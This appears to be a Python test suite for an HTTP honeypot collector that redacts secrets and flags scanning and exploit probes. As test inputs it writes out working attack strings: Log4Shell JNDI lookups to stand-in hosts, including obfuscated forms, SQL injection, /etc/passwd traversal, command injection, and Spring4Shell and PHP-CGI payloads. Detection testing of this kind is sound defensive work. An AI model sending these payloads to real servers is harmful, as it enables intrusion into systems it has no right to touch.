import dataclasses
import datetime as dt
import http.client
import json
import os
import socket
import ssl
import subprocess
import tempfile
import threading
import time
import unittest
from unittest import mock
from pathlib import Path

import collector
from collector import (
    CollectorConfig,
    classify_host_header,
    classify_sni,
    create_server,
    prune_temp_jsonl,
)
from signatures import (
    SIGNATURE_RULES,
    InspectionInput,
    RuleHit,
    SignatureRule,
    derive_signature_attack_category,
    inspect_http_request,
)


class HttpCollectorSecurityTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir = tempfile.TemporaryDirectory()
        self.output_path = Path(self.tmpdir.name) / "events.jsonl"
        self.config = CollectorConfig(
            host="127.0.0.1",
            port=0,  # ephemeral localhost port
            protocol_label="http",
            reported_dst_port=80,
            output_jsonl=self.output_path,
            max_body_bytes=64,
            max_path_length=128,
        )
        self.server = create_server(self.config)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)
        self.tmpdir.cleanup()

    def _read_records(self) -> list[dict]:
        lines = self.output_path.read_text(encoding="utf-8").strip().splitlines()
        return [json.loads(line) for line in lines]

    def test_strips_sensitive_headers_and_redacts_query_secrets(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/wp-login.php?user=admin&password=secret123&token=tok999",
            headers={
                "User-Agent": "SyntheticScanner/1.0",
                "Authorization": "Bearer DO_NOT_STORE",
                "Cookie": "session=DO_NOT_STORE",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        rec = records[0]
        self.assertEqual(rec["event_type"], "http_cms_probe")
        self.assertEqual(
            rec["http_path"],
            "/wp-login.php?user=[REDACTED]&password=[REDACTED]&token=[REDACTED]",
        )
        headers = rec["metadata"]["headers"]
        self.assertEqual(headers.get("user-agent"), "SyntheticScanner/1.0")
        self.assertNotIn("authorization", headers)
        self.assertNotIn("cookie", headers)

    def test_truncates_oversize_body_without_unbounded_buffering(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        oversize_payload = b"A" * 500
        conn.request("POST", "/cgi-bin/luci/test", body=oversize_payload)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        meta = records[0]["metadata"]
        self.assertEqual(records[0]["event_type"], "http_router_probe")
        self.assertTrue(meta["body_truncated"])
        self.assertEqual(meta["sampled_body_bytes"], 64)
        self.assertEqual(meta["declared_content_length"], 500)
        self.assertIsNotNone(meta["body_sha256"])

    def test_bounds_long_paths_and_records_hostile_strings_inertly(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        long_path = "/.env?q=" + ("x" * 300)
        conn.request("GET", long_path)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertLessEqual(len(records[0]["http_path"]), 128)
        self.assertEqual(records[0]["event_type"], "http_secret_file_probe")

    def test_redacts_secrets_in_referer_query_string(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/login",
            headers={
                "Referer": "https://example.invalid/auth?session=SECRET_SESS&next=/home",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertEqual(
            records[0]["metadata"]["headers"].get("referer"),
            "https://example.invalid/auth?session=[REDACTED]&next=[REDACTED]",
        )

    def test_prunes_jsonl_records_older_than_24h(self) -> None:
        now = dt.datetime(2026, 11, 21, tzinfo=dt.timezone.utc)
        old = (now - dt.timedelta(hours=25)).isoformat().replace("+00:00", "Z")
        fresh = now.isoformat().replace("+00:00", "Z")
        self.output_path.write_text(
            json.dumps({"observed_at": old, "src_ip": "192.0.2.1"})
            + "\n"
            + json.dumps({"observed_at": fresh, "src_ip": "192.0.2.2"})
            + "\n",
            encoding="utf-8",
        )
        prune_temp_jsonl(self.output_path, now=now)
        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["src_ip"], "192.0.2.2")

    def test_prune_streams_drops_invalid_lines_and_leaves_no_temp_files(self) -> None:
        now = dt.datetime(2026, 11, 21, tzinfo=dt.timezone.utc)
        old = (now - dt.timedelta(hours=30)).isoformat().replace("+00:00", "Z")
        fresh = now.isoformat().replace("+00:00", "Z")
        self.output_path.write_text(
            json.dumps({"observed_at": old, "id": "old"})
            + "\n\nnot-json\n"
            + json.dumps({"observed_at": "garbage", "id": "bad-ts"})
            + "\n"
            + json.dumps(["not", "an", "object"])
            + "\n"
            + json.dumps({"observed_at": fresh, "id": "fresh-1"})
            + "\n"
            + json.dumps({"observed_at": fresh, "id": "fresh-2"})
            + "\n",
            encoding="utf-8",
        )
        self.output_path.chmod(0o640)
        prune_temp_jsonl(self.output_path, now=now)
        self.assertEqual([r["id"] for r in self._read_records()], ["fresh-1", "fresh-2"])
        self.assertEqual(self.output_path.stat().st_mode & 0o777, 0o640)
        leftovers = [p.name for p in self.output_path.parent.iterdir() if p.name.endswith(".prune")]
        self.assertEqual(leftovers, [])

    def test_prune_does_not_rewrite_when_nothing_expired(self) -> None:
        now = dt.datetime(2026, 11, 21, tzinfo=dt.timezone.utc)
        fresh = now.isoformat().replace("+00:00", "Z")
        self.output_path.write_text(
            json.dumps({"observed_at": fresh, "id": "a"}) + "\n", encoding="utf-8"
        )
        inode_before = self.output_path.stat().st_ino
        # An unchanged log must not need a temporary copy (or its disk space).
        with mock.patch.object(
            collector.tempfile, "mkstemp", side_effect=OSError("no space left")
        ) as mkstemp:
            prune_temp_jsonl(self.output_path, now=now)
        mkstemp.assert_not_called()
        self.assertEqual(self.output_path.stat().st_ino, inode_before)
        self.assertEqual([r["id"] for r in self._read_records()], ["a"])

    def test_prune_failure_does_not_block_recording_and_backs_off(self) -> None:
        with mock.patch.object(
            collector, "prune_temp_jsonl", side_effect=OSError("no space left")
        ) as prune, mock.patch.object(collector.sys, "stderr") as stderr:
            for path in ("/first", "/second"):
                conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
                conn.request("GET", path)
                resp = conn.getresponse()
                resp.read()
                conn.close()
                self.assertEqual(resp.status, 404)
        self.assertEqual([r["http_path"] for r in self._read_records()], ["/first", "/second"])
        # Retried at most once per minute, not on every request.
        self.assertEqual(prune.call_count, 1)
        written = "".join(call.args[0] for call in stderr.write.call_args_list)
        self.assertIn("prune failed (OSError)", written)
        self.assertNotIn("no space left", written)

    def test_first_write_prunes_even_right_after_boot(self) -> None:
        # A freshly booted host or CI runner can report monotonic() < 60s;
        # the first write must still prune instead of waiting a full minute.
        with mock.patch.object(collector.time, "monotonic", return_value=1.0), mock.patch.object(
            collector, "prune_temp_jsonl"
        ) as prune:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", "/boot")
            resp = conn.getresponse()
            resp.read()
            conn.close()
        self.assertEqual(prune.call_count, 1)

    def test_classifies_host_header_without_keeping_its_value(self) -> None:
        cases = {
            None: "absent",
            "": "absent",
            "   ": "absent",
            "203.0.113.10": "ip_literal",
            "203.0.113.10:8080": "ip_literal",
            "[2001:db8::1]": "ip_literal",
            "[2001:db8::1]:443": "ip_literal",
            "victim-corp.example": "hostname",
            "victim-corp.example:8443": "hostname",
            "${jndi:ldap://host-e2e.invalid/a}": "hostname",
            "\x00203.0.113.10": "ip_literal",
            # Unicode whitespace; same cases as metadata_sanitization_test.sql.
            "\u00a0": "absent",
            "\u00a0203.0.113.5\u0085": "ip_literal",
            "\u3000\u2028[2001:db8::2]\u202f": "ip_literal",
            "\u0085victim-corp.example\u00a0": "hostname",
        }
        for value, expected in cases.items():
            self.assertEqual(classify_host_header(value), expected, repr(value))

    def test_never_persists_host_header_value(self) -> None:
        requests = [
            ("203.0.113.10:80", "ip_literal"),
            ("victim-corp.example", "hostname"),
            (None, "absent"),
        ]
        for host, _ in requests:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.putrequest("GET", "/", skip_host=True)
            if host is not None:
                conn.putheader("Host", host)
            conn.endheaders()
            conn.getresponse().read()
            conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for forbidden in ("203.0.113.10", "victim-corp.example", f"127.0.0.1:{self.port}"):
            self.assertNotIn(forbidden, raw_jsonl)
        records = self._read_records()
        self.assertEqual([r["metadata"]["host_kind"] for r in records], [kind for _, kind in requests])
        for record in records:
            self.assertNotIn("host", record["metadata"]["headers"])

    def test_never_persists_client_ip_headers(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/index.html",
            headers={
                "User-Agent": "SyntheticScanner/1.0",
                "X-Forwarded-For": "203.0.113.77, 198.51.100.9",
                "X-Real-IP": "203.0.113.78",
                "Forwarded": "for=203.0.113.79",
            },
        )
        resp = conn.getresponse()
        resp.read()
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for ip in ("203.0.113.77", "198.51.100.9", "203.0.113.78", "203.0.113.79"):
            self.assertNotIn(ip, raw_jsonl)
        headers = self._read_records()[0]["metadata"]["headers"]
        self.assertNotIn("x-forwarded-for", headers)
        self.assertNotIn("x-real-ip", headers)
        self.assertNotIn("forwarded", headers)
        self.assertEqual(headers.get("user-agent"), "SyntheticScanner/1.0")

    def test_rejects_requests_when_concurrency_cap_is_exhausted(self) -> None:
        # Exhaust all permits in the server semaphore to deterministically test 503 shedding
        permits = self.config.max_concurrent_connections
        for _ in range(permits):
            self.assertTrue(self.server.connection_semaphore.acquire(blocking=False))
        try:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", "/overload-check")
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 503)
            conn.close()
            self.assertEqual(self.server.rejected_overload, 1)
        finally:
            for _ in range(permits):
                self.server.connection_semaphore.release()

    def test_slow_headers_time_out_without_blocking_the_next_request(self) -> None:
        self.server.config = dataclasses.replace(
            self.server.config, socket_timeout_seconds=0.4
        )
        sock = socket.create_connection(("127.0.0.1", self.port), timeout=2)
        sock.sendall(b"GET /slow HTTP/1.1\r\nHost: 127.0.0.1\r\n")
        time.sleep(0.8)
        sock.close()

        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request("GET", "/still-up")
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()
        paths = [rec["http_path"] for rec in self._read_records()]
        self.assertIn("/still-up", paths)

    def test_drops_oversized_headers_without_storing_them(self) -> None:
        self.server.config = dataclasses.replace(self.server.config, max_header_bytes=128)
        sock = socket.create_connection(("127.0.0.1", self.port), timeout=2)
        sock.sendall(b"GET / HTTP/1.1\r\nUser-Agent: " + (b"A" * 4000) + b"\r\n\r\n")
        sock.settimeout(2)
        raw_response = b""
        try:
            raw_response = sock.recv(256)
        except OSError:
            pass
        sock.close()

        self.assertIn(b"431", raw_response)
        stored = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("A" * 64, stored)
        records = self._read_records()
        self.assertEqual(len(records), 1)
        self.assertTrue(records[0]["metadata"].get("header_rejected"))

        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request("GET", "/after-header-limit")
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()
        self.assertEqual(len(self._read_records()), 2)

    def test_detects_log4shell_in_user_agent_without_storing_attacker_url(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/",
            headers={
                "User-Agent": "${jndi:ldap://attacker.invalid:1389/Exploit}",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("attacker.invalid", raw_jsonl)
        self.assertNotIn("1389/Exploit", raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), 1)
        rec = records[0]
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        det = detections[0]
        self.assertEqual(det["signature_id"], "http-log4shell-jndi-lookup")
        self.assertEqual(det["rule_version"], "1.1.0")
        self.assertEqual(det["attack_technique"], "jndi_injection")
        self.assertEqual(det["candidate_cve"], "CVE-2021-44228")
        self.assertEqual(det["candidate_cves"], ["CVE-2021-44228"])
        self.assertEqual(det["matched_location"], "header:user-agent")
        self.assertEqual(det["match_strength"], "high")
        self.assertEqual(det["classification"], "candidate_cve")
        self.assertGreaterEqual(det["confidence"], 0.8)
        self.assertEqual(det["evidence"]["indicator"], "jndi_lookup_with_scheme")
        self.assertFalse(det["evidence"]["obfuscation_detected"])
        self.assertEqual(
            det["references"],
            ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        )
        self.assertIn("Suspected CVE-2021-44228", det["summary"])
        self.assertIn("not confirmed exploitation", det["summary"])

    def test_detects_log4shell_in_url_including_url_encoding(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fa%7D",
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("evil.invalid", raw_jsonl)

        rec = self._read_records()[0]
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "url")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")

    def test_detects_log4shell_in_body_and_discards_raw_payload(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload = b'{"msg":"${jndi:rmi://body-evil.invalid/a}"}'
        conn.request(
            "POST",
            "/api/login",
            body=payload,
            headers={"Content-Type": "application/json"},
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("body-evil.invalid", raw_jsonl)
        self.assertNotIn("${jndi:", raw_jsonl)

        rec = self._read_records()[0]
        self.assertEqual(rec["event_type"], "http_payload_probe")
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "body")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")
        self.assertIsNotNone(rec["metadata"]["body_sha256"])

    def test_detects_obfuscated_log4shell_patterns_and_non_allowlisted_headers(self) -> None:
        cases = [
            (
                "X-Api-Version",
                "${${lower:j}ndi:${::-l}${::-d}ap://obf1.invalid/a}",
                "header:x-api-version",
            ),
            (
                "X-Forwarded-For",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-r}mi://obf2.invalid/a}",
                "header:x-forwarded-for",
            ),
            (
                "User-Agent",
                "%2524%257B%2524%257Bupper%253Aj%257Dndi%253Adns%253A%252F%252Fobf3.invalid%252Fa%257D",
                "header:user-agent",
            ),
        ]
        for header_name, header_val, expected_loc in cases:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", "/probe", headers={header_name: header_val})
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for forbidden in ("obf1.invalid", "obf2.invalid", "obf3.invalid"):
            self.assertNotIn(forbidden, raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), len(cases))
        for rec, (_, _, expected_loc) in zip(records, cases):
            self.assertEqual(rec["attack_category"], "suspected_cve_probe")
            detections = rec["metadata"]["signature_detections"]
            self.assertEqual(len(detections), 1)
            self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")
            self.assertEqual(detections[0]["candidate_cves"], ["CVE-2021-44228"])
            self.assertEqual(detections[0]["matched_location"], expected_loc)
            self.assertTrue(detections[0]["evidence"]["obfuscation_detected"])

    def test_normal_http_request_produces_no_signature_detections(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "POST",
            "/index.html?page=2",
            body=b"hello=world&note=normal-request",
            headers={"User-Agent": "Mozilla/5.0 (compatible; BenignCheck/1.0)"},
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        rec = self._read_records()[0]
        self.assertNotIn("signature_detections", rec["metadata"])
        self.assertNotIn("attack_category", rec)

    def test_oversize_body_truncates_inspection_at_max_body_bytes(self) -> None:
        # max_body_bytes is 64 in setUp; payload placed after byte 80 must not be buffered/inspected
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload_after_cap = (b"A" * 80) + b"${jndi:ldap://late.invalid/a}"
        conn.request("POST", "/upload", body=payload_after_cap)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        # Payload inside the first 64 bytes is detected while the rest is truncated
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        payload_within_cap = b"${jndi:ldap://early.invalid/a}" + (b"B" * 200)
        conn.request("POST", "/upload", body=payload_within_cap)
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("late.invalid", raw_jsonl)
        self.assertNotIn("early.invalid", raw_jsonl)

        records = self._read_records()
        self.assertEqual(len(records), 2)
        self.assertTrue(records[0]["metadata"]["body_truncated"])
        self.assertNotIn("signature_detections", records[0]["metadata"])

        self.assertTrue(records[1]["metadata"]["body_truncated"])
        self.assertEqual(records[1]["attack_category"], "suspected_cve_probe")
        self.assertEqual(
            records[1]["metadata"]["signature_detections"][0]["matched_location"],
            "body",
        )

    def test_sensitive_header_match_redacts_location_and_leaks_no_secrets(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/auth?password=TOPSECRET_PASS&token=TOPSECRET_TOK",
            headers={
                "Authorization": "Bearer SECRET_JWT ${jndi:ldap://secret-cb.invalid/x}",
                "Cookie": "session=SECRET_COOKIE",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        for secret in (
            "TOPSECRET_PASS",
            "TOPSECRET_TOK",
            "SECRET_JWT",
            "SECRET_COOKIE",
            "secret-cb.invalid",
        ):
            self.assertNotIn(secret, raw_jsonl)

        rec = self._read_records()[0]
        detections = rec["metadata"]["signature_detections"]
        self.assertEqual(len(detections), 1)
        self.assertEqual(detections[0]["matched_location"], "header:redacted")
        self.assertEqual(detections[0]["candidate_cve"], "CVE-2021-44228")

    def test_supports_technique_only_and_multi_cve_rules_without_collector_changes(self) -> None:
        extra_rules = (
            SignatureRule(
                signature_id="http-generic-sqli-test",
                rule_version="1.0.0",
                attack_technique="sql_injection",
                classification="indicator_match",
                candidate_cves=(),
                references=("https://owasp.org/www-community/attacks/SQL_Injection",),
                match_text=lambda norm: RuleHit(
                    match_strength="medium",
                    confidence=0.7,
                    indicator="union_select_pattern",
                    summary="Observed SQL injection indicator; no specific CVE inferred.",
                )
                if "marker-sqli" in norm.text
                else None,
            ),
            SignatureRule(
                signature_id="http-multi-cve-traversal-test",
                rule_version="1.0.0",
                attack_technique="path_traversal",
                classification="candidate_cve",
                candidate_cves=("CVE-2021-41773", "CVE-2021-42013"),
                references=(
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
                ),
                match_text=lambda norm: RuleHit(
                    match_strength="high",
                    confidence=0.85,
                    indicator="apache_encoded_traversal",
                    summary="Suspected Apache HTTP Server path traversal probe; candidate CVEs only.",
                )
                if "marker-apache" in norm.text
                else None,
            ),
        )

        # 1. Technique-only detection (no CVE) maps to web_attack_attempt
        sqli_matches = inspect_http_request(
            InspectionInput(
                method="GET",
                raw_path="/items?q=marker-sqli",
                headers=(),
                body_bytes=b"",
            ),
            rules=extra_rules,
        )
        self.assertEqual(len(sqli_matches), 1)
        sqli_dict = sqli_matches[0].to_dict()
        self.assertEqual(sqli_dict["classification"], "indicator_match")
        self.assertEqual(sqli_dict["attack_technique"], "sql_injection")
        self.assertEqual(sqli_dict["candidate_cves"], [])
        self.assertIsNone(sqli_dict["candidate_cve"])
        self.assertEqual(derive_signature_attack_category(sqli_matches), "web_attack_attempt")

        # 2. Multi-CVE detection preserves all candidates and leaves singular candidate_cve as None
        multi_matches = inspect_http_request(
            InspectionInput(
                method="GET",
                raw_path="/cgi-bin/marker-apache",
                headers=(),
                body_bytes=b"",
            ),
            rules=extra_rules,
        )
        self.assertEqual(len(multi_matches), 1)
        multi_dict = multi_matches[0].to_dict()
        self.assertEqual(multi_dict["candidate_cves"], ["CVE-2021-41773", "CVE-2021-42013"])
        self.assertIsNone(multi_dict["candidate_cve"])
        self.assertEqual(derive_signature_attack_category(multi_matches), "suspected_cve_probe")

        # 3. Invalid rule definitions are rejected
        with self.assertRaises(ValueError):
            SignatureRule(
                signature_id="invalid-rule",
                rule_version="1.0.0",
                attack_technique="rce",
                classification="candidate_cve",
                candidate_cves=(),
                match_text=lambda _: None,
            )
        with self.assertRaises(ValueError):
            SignatureRule(
                signature_id="invalid-indicator-with-cve",
                rule_version="1.0.0",
                attack_technique="sql_injection",
                classification="indicator_match",
                candidate_cves=("CVE-2021-44228",),
                match_text=lambda _: None,
            )
        with self.assertRaises(ValueError):
            SignatureRule(
                signature_id="invalid-cve-format",
                rule_version="1.0.0",
                attack_technique="rce",
                classification="candidate_cve",
                candidate_cves=("NOT-A-CVE",),
                match_text=lambda _: None,
            )

    def test_redacts_encoded_jndi_even_when_mixed_with_literal_braces(self) -> None:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        conn.request(
            "GET",
            "/probe",
            headers={
                "User-Agent": "${safe} %24%7Bjndi%3Aldap%3A%2F%2Fmixed-evil.invalid%2Fa%7D",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 404)
        conn.close()

        raw_jsonl = self.output_path.read_text(encoding="utf-8")
        self.assertNotIn("mixed-evil.invalid", raw_jsonl)
        rec = self._read_records()[0]
        self.assertEqual(rec["metadata"]["headers"]["user-agent"], "[REDACTED_JNDI]")
        self.assertEqual(rec["attack_category"], "suspected_cve_probe")

    def test_detects_generic_attack_techniques_without_claiming_cves(self) -> None:
        cases = [
            (
                "GET",
                "/items?id=1%20UN/**/ION%20SELECT%201,2,3",
                None,
                "http-sqli-attempt",
                "sql_injection",
                "url",
            ),
            (
                "GET",
                "/items?id=1+UNION+SELECT+1,2,3",
                None,
                "http-sqli-attempt",
                "sql_injection",
                "url",
            ),
            (
                "GET",
                "/static/../../etc/passwd",
                None,
                "http-path-traversal-attempt",
                "path_traversal",
                "url",
            ),
            (
                "POST",
                "/run",
                b"cmd=test;id",
                "http-cmd-injection-attempt",
                "command_injection",
                "body",
            ),
        ]
        for method, path, body, expected_sig, expected_tech, expected_loc in cases:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request(method, path, body=body)
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        records = self._read_records()
        self.assertEqual(len(records), len(cases))
        for rec, (_, _, _, expected_sig, expected_tech, expected_loc) in zip(records, cases):
            self.assertEqual(rec["attack_category"], "web_attack_attempt")
            dets = rec["metadata"]["signature_detections"]
            matched = [d for d in dets if d["signature_id"] == expected_sig]
            self.assertEqual(len(matched), 1)
            det = matched[0]
            self.assertEqual(det["classification"], "indicator_match")
            self.assertEqual(det["attack_technique"], expected_tech)
            self.assertEqual(det["candidate_cves"], [])
            self.assertIsNone(det["candidate_cve"])
            self.assertEqual(det["matched_location"], expected_loc)
            self.assertIn("no specific CVE inferred", det["summary"])

    def test_detects_additional_cve_specific_http_signatures(self) -> None:
        cases = [
            (
                "GET",
                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                None,
                "http-apache-path-traversal-cve-2021-41773",
                ["CVE-2021-41773", "CVE-2021-42013"],
                None,
            ),
            (
                "POST",
                "/app",
                b"class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
                "http-spring4shell-cve-2022-22965",
                ["CVE-2022-22965"],
                "CVE-2022-22965",
            ),
            (
                "POST",
                "/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                b"<?php echo 1; ?>",
                "http-php-cgi-arg-injection-cve-2024-4577",
                ["CVE-2024-4577"],
                "CVE-2024-4577",
            ),
            (
                "POST",
                "/cgi-bin/php-cgi.exe?%ADdallow_url_include%3d1",
                b"<?php echo 1; ?>",
                "http-php-cgi-arg-injection-cve-2024-4577",
                ["CVE-2024-4577"],
                "CVE-2024-4577",
            ),
        ]
        # Increase max_body_bytes for Spring4Shell form parameter in body
        self.server.config = dataclasses.replace(self.server.config, max_body_bytes=256)
        for method, path, body, expected_sig, expected_cves, expected_single in cases:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request(method, path, body=body)
            resp = conn.getresponse()
            resp.read()
            self.assertEqual(resp.status, 404)
            conn.close()

        records = self._read_records()
        self.assertEqual(len(records), len(cases))
        for rec, (_, _, _, expected_sig, expected_cves, expected_single) in zip(records, cases):
            self.assertEqual(rec["attack_category"], "suspected_cve_probe")
            dets = rec["metadata"]["signature_detections"]
            matched = [d for d in dets if d["signature_id"] == expected_sig]
            self.assertEqual(len(matched), 1)
            det = matched[0]
            self.assertEqual(det["classification"], "candidate_cve")
            self.assertEqual(det["candidate_cves"], expected_cves)
            self.assertEqual(det["candidate_cve"], expected_single)
            self.assertTrue(len(det["references"]) >= 1)
            self.assertIn("not confirmed exploitation", det["summary"])

    def test_path_rules_detect_recon_without_changing_attack_category(self) -> None:
        cases = [
            ("/developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1",
             "http-sap-netweaver-cve-2025-31324", "sap_visual_composer_metadatauploader_path", "suspected_cve_probe"),
            ("/.env", "http-sensitive-file-probe", "dotenv_file_path", None),
            ("/admin/.env.production", "http-sensitive-file-probe", "dotenv_file_path", None),
            ("/.git/config", "http-sensitive-file-probe", "vcs_metadata_path", None),
            ("/terraform.tfstate", "http-sensitive-file-probe", "secret_or_backup_file_path", None),
            ("/wp-config.php.bak", "http-sensitive-file-probe", "secret_or_backup_file_path", None),
            ("/api/mcp", "http-mcp-endpoint-probe", "mcp_endpoint_path", None),
            ("/sse", "http-mcp-endpoint-probe", "mcp_endpoint_path", None),
            ("/actuator/env", "http-debug-endpoint-probe", "spring_actuator_path", None),
            ("/phpinfo.php", "http-debug-endpoint-probe", "php_info_page_path", None),
            ("/server-status", "http-debug-endpoint-probe", "server_status_path", None),
            ("/debug/default/view", "http-debug-endpoint-probe", "framework_debug_panel_path", None),
            ("/%2e%65nv", "http-sensitive-file-probe", "dotenv_file_path", None),
        ]
        for path, *_ in cases:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request("GET", path)
            conn.getresponse().read()
            conn.close()

        records = self._read_records()
        self.assertEqual(len(records), len(cases))
        for rec, (path, sig, indicator, category) in zip(records, cases):
            dets = rec["metadata"]["signature_detections"]
            self.assertEqual([d["signature_id"] for d in dets], [sig], path)
            self.assertEqual(dets[0]["evidence"]["indicator"], indicator, path)
            self.assertEqual(dets[0]["matched_location"], "url", path)
            self.assertIn("not confirmed exploitation" if category else "exploitation outcome is unknown", dets[0]["summary"])
            if category is None:
                # Reconnaissance stays a path probe; aggregate semantics are unchanged.
                self.assertNotIn("attack_category", rec, path)
            else:
                self.assertEqual(rec["attack_category"], category)
                self.assertEqual(dets[0]["candidate_cves"], ["CVE-2025-31324"])

    def test_path_rules_ignore_headers_body_and_lookalike_paths(self) -> None:
        self.server.config = dataclasses.replace(self.server.config, max_body_bytes=256)
        requests = [
            ("GET", "/", {"Referer": "https://ref.example/.env", "User-Agent": "scan /.git/config /mcp"}, None),
            ("POST", "/upload", {}, b"/developmentserver/metadatauploader /actuator/env"),
            ("GET", "/environment", {}, None),
            ("GET", "/developmentserver/metadatauploaderx", {}, None),
            ("GET", "/mcpx", {}, None),
            ("GET", "/docs/mcp", {}, None),
            ("GET", "/git/config", {}, None),
            ("GET", "/wp-config.php", {}, None),
            ("GET", "/debugger", {}, None),
        ]
        for method, path, headers, body in requests:
            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
            conn.request(method, path, body=body, headers=headers)
            conn.getresponse().read()
            conn.close()
        for rec in self._read_records():
            self.assertNotIn("signature_detections", rec["metadata"], rec["http_path"])

    def test_absolute_form_query_or_fragment_mentions_do_not_match(self) -> None:
        def ids(path: str) -> list[str]:
            return [m.signature_id for m in inspect_http_request(
                InspectionInput(method="GET", raw_path=path, headers=(), body_bytes=b""))]

        for path in (
            "http://example.invalid?next=/developmentserver/metadatauploader",
            "http://example.invalid#/developmentserver/metadatauploader",
            "http://example.invalid#/.env",
            "https://h.invalid?x=/mcp",
            "https://h.invalid?redirect=%2Factuator%2Fenv",
